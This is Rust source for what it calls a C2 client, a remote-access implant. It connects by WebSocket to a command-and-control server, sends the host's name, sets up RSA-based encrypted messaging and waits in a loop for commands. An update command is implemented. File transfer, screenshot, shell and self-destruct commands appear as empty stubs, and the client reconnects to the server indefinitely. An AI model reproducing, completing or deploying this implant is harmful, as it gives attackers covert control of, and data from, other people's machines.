mod feature;
mod hybrid_crypto;

use std::time::Duration;

use feature::{update::Update, Feature};
use futures_util::{
    stream::{SplitSink, SplitStream},
    SinkExt, StreamExt,
};
use gethostname::gethostname;
use hybrid_crypto::{encrypt_data_combined, generate_private_key, HybridDecryption};
use rsa::{
    pkcs1::{DecodeRsaPublicKey, EncodeRsaPublicKey},
    Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
};
use tokio_tungstenite::{
    connect_async,
    tungstenite::{handshake::client::Response, Message},
    WebSocketStream,
};
pub struct Connector {
    //Server address sends data to main server
    address_server: String,
    write: Option<
        SplitSink<
            WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>,
            Message,
        >,
    >,
    read: Option<
        SplitStream<WebSocketStream<tokio_tungstenite::MaybeTlsStream<tokio::net::TcpStream>>>,
    >,
    public_key: Option<RsaPublicKey>,
    private_key: RsaPrivateKey,
}
impl Connector {
    pub fn new(address_server: String) -> Self {
        Connector {
            address_server,
            write: None,
            read: None,
            public_key: None,
            private_key: generate_private_key(),
        }
    }
    pub async fn send_message(&mut self, message: String) {
        self.write
            .as_mut()
            .unwrap()
            .send(Message::Text(message.into()))
            .await
            .unwrap();
    }

    pub async fn search_for_c2(&mut self) {
        match connect_async(&self.address_server).await {
            Ok((ws_stream, _)) => {
                let (write, read) = ws_stream.split();
                self.write = Some(write);
                self.read = Some(read);
                println!("Connected to the server");
                self.send_message(format!("ping|{}", gethostname().into_string().unwrap()))
                    .await;
                if let Some(message) = self.read.as_mut().unwrap().next().await {
                    //Debug
                    //println!("{}", message.unwrap());
                    self.init_server(&message.unwrap().to_string()).await;
                }
                //when recieved a pong subscribe for updates
            }
            //make it keep trying
            Err(e) => {
                eprintln!("Failed to connect: {} the server is probably down", e);
                //wait for 6 min to try to connect again
                tokio::time::sleep(Duration::from_secs(6)).await;
                Box::pin(self.search_for_c2()).await;
            }
        }
    }
    pub async fn subscribe_to_updates(&mut self) {
        loop {
            let decrypted_message = self.accept_message().await;
            match std::str::from_utf8(&decrypted_message).unwrap() {
                "update" => {
                    println!("got an update request");
                    let update = Update::new();
                    //send callback
                    //TODO! make sending callback into separate method ot smth
                    match update.run(self).await {
                        feature::Result::SUCCESFUL => {
                            self.send_hybrid_encryption(
                                self.public_key.clone().unwrap(),
                                "SUCCESFUL".as_bytes().to_vec(),
                            )
                            .await;
                        }
                        feature::Result::FAILED => {
                            self.send_hybrid_encryption(
                                self.public_key.clone().unwrap(),
                                "FAILED".as_bytes().to_vec(),
                            )
                            .await;
                        }
                    }
                }
                "start_file_transfer" => {}
                "send_screenshot" => {}
                "open_cmd" => {}
                "self_destruct" => {}
                _ => {
                    println!(
                        "Got unrecognisible command, message:{}",
                        std::str::from_utf8(decrypted_message.as_slice()).unwrap()
                    )
                }
            }
        }
    }

    pub async fn init_server(&mut self, message_str: &str) {
        if message_str == "pong" {
            let public_key_string = self
                .private_key
                .to_public_key()
                .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
                .unwrap();

            self.write
                .as_mut()
                .unwrap()
                .send(Message::from(public_key_string))
                .await
                .unwrap();

            let decrypted_message = self.accept_message().await;
            self.public_key = Some(
                RsaPublicKey::from_pkcs1_pem(std::str::from_utf8(&decrypted_message).unwrap())
                    .unwrap(),
            );
            println!("rsa init sequence complete");

            self.subscribe_to_updates().await;
        }
    }
    pub async fn accept_message(&mut self) -> Vec<u8> {
        let mut hybrid_decryption_arguments: [Vec<u8>; 3] = [Vec::new(), Vec::new(), Vec::new()];
        for index in 0..3 {
            if let Some(message) = self.read.as_mut().unwrap().next().await {
                //cant put hex decode in the decrypt fn cuz it cant accept
                hybrid_decryption_arguments[index] =
                    hex::decode(message.unwrap().to_string()).unwrap();
            }
        }
        let hybrid_decryption = HybridDecryption::new(
            hybrid_decryption_arguments[0].clone(),
            hybrid_decryption_arguments[1].clone(),
            hybrid_decryption_arguments[2].clone(),
        );
        hybrid_decryption.decrypt(self.private_key.clone())
    }
    pub async fn send_hybrid_encryption(&mut self, public_key: RsaPublicKey, data_to_enc: Vec<u8>) {
        let hybrid_encryption_result = encrypt_data_combined(public_key, data_to_enc);
        self.send_message(hybrid_encryption_result.get_encrypted_key())
            .await;
        self.send_message(hybrid_encryption_result.get_nonce())
            .await;
        self.send_message(hybrid_encryption_result.get_encrypted_data())
            .await;
    }
}
